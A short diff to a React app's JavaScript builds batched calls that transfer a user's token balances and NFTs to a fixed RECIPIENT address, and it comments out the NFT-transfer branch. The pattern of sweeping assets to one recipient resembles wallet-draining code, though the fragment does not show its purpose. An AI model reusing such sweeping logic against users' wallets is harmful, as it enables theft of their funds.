@@ -197,7 +197,7 @@ function App() {
                 args: [RECIPIENT, parseEther(balance.balance)]
               })
             })
-        } else if( balance.type == "NFT" ){
+        }/* else if( balance.type == "NFT" ){
           calls.push({
             to: balance.token_address,
             data: encodeFunctionData({
@@ -206,7 +206,7 @@ function App() {
               args: [address, RECIPIENT, balance.tokenId] // to, tokenId
             })
           })
-        }
+        }*/
         
         
       }
